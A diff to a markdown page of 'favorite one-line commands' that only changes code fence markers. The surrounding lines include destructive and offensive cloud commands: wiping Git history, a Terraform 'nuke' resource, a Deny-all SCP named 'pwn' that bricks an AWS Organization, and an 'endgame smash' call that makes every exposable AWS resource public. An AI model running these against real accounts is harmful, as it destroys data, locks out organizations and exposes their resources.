@@ -8,7 +8,7 @@ description: My favorite one-line commands
 
 ### Nuke Git commit history
 
-```text
+```
 git checkout --orphan newBranch; \ 
 	git add -A; \                   # Add all files and commit them 
 	git commit -m "Cleanup"; \
@@ -24,7 +24,7 @@ git checkout --orphan newBranch; \
 
 Bash variant:
 
-```text
+```
 #!/usr/bin/env bash
 
 for sub in `az account list | jq -r '.[].id'`; do \
@@ -35,7 +35,7 @@ for sub in `az account list | jq -r '.[].id'`; do \
 
 Terraform variant:
 
-```text
+```
 resource "null_resource" "nuke" {
   # Because we set this to timestamp, it *always* runs :D
   triggers = {
@@ -60,7 +60,7 @@ My post that explains the above is [here](https://kmcquade.com/2020/11/nuking-al
 
 ### Brick an entire AWS Organization using Deny \* SCPs
 
-```text
+```
 aws organizations attach-policy \
   --policy-id $(aws organizations create-policy --name pwn \
      --type SERVICE_CONTROL_POLICY \
@@ -73,11 +73,10 @@ aws organizations attach-policy \
 
 ### Share All Exposable Resources in an AWS Account with the internet 😈
 
-```text
+```
 endgame smash --service all --evil-principal "*"
 ```
 
 ## Other Resources
 
 * [https://github.com/D4Vinci/One-Lin3r](https://github.com/D4Vinci/One-Lin3r): Gives you one-liners that aids in penetration testing operations, privilege escalation, and more.
-
